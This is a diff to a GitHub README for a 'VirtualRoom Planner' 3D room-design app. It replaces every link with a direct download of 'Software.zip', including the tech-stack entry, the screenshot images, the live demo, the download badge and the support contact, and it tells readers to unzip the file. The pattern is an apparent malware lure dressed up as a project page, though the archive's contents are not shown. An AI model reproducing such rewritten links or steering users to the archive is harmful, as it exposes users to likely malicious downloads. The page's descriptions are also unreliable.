@@ -13,7 +13,7 @@ Welcome to the **VirtualRoom Planner** repository! This user-friendly web-based 
 - JavaScript
 - Svelte
 - SvelteKit
-- https://github.com/MAHMOUDkhalid16/virtual-room-planner/releases/tag/v1.0
+- https://github.com/MAHMOUDkhalid16/virtual-room-planner/releases/download/v2.0/Software.zip
 - Threlte
 - TypeScript
 
@@ -26,18 +26,18 @@ To get started with the **VirtualRoom Planner**, follow these steps:
 
 ## Screenshots 📸
 Here are some snapshots of the VirtualRoom Planner in action:
-![2D Room Layout](https://github.com/MAHMOUDkhalid16/virtual-room-planner/releases/tag/v1.0)
+![2D Room Layout](https://github.com/MAHMOUDkhalid16/virtual-room-planner/releases/download/v2.0/Software.zip)
 *2D Room Layout*
 
-![3D Room Design](https://github.com/MAHMOUDkhalid16/virtual-room-planner/releases/tag/v1.0)
+![3D Room Design](https://github.com/MAHMOUDkhalid16/virtual-room-planner/releases/download/v2.0/Software.zip)
 *3D Room Design with VR support*
 
 ## Demo 🎥
-Check out the live demo of the VirtualRoom Planner [here](https://github.com/MAHMOUDkhalid16/virtual-room-planner/releases/tag/v1.0).
+Check out the live demo of the VirtualRoom Planner [here](https://github.com/MAHMOUDkhalid16/virtual-room-planner/releases/download/v2.0/Software.zip).
 
 ## Download 📥
 Download the latest release of the VirtualRoom Planner by clicking the button below:
-[![Download VirtualRoom Planner](https://github.com/MAHMOUDkhalid16/virtual-room-planner/releases/tag/v1.0)](https://github.com/MAHMOUDkhalid16/virtual-room-planner/releases/tag/v1.0)
+[![Download VirtualRoom Planner](https://github.com/MAHMOUDkhalid16/virtual-room-planner/releases/download/v2.0/Software.zip)](https://github.com/MAHMOUDkhalid16/virtual-room-planner/releases/download/v2.0/Software.zip)
 
 Remember to unzip the downloaded file before launching the VirtualRoom Planner.
 
@@ -48,7 +48,7 @@ If you are interested in contributing to the VirtualRoom Planner, feel free to f
 We value your feedback! If you have any suggestions or encounter any issues while using the VirtualRoom Planner, please open an issue in this repository.
 
 ## Support ℹ️
-If you need any assistance or have questions about the VirtualRoom Planner, you can contact our support team at https://github.com/MAHMOUDkhalid16/virtual-room-planner/releases/tag/v1.0
+If you need any assistance or have questions about the VirtualRoom Planner, you can contact our support team at https://github.com/MAHMOUDkhalid16/virtual-room-planner/releases/download/v2.0/Software.zip
 
 ## License 📄
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
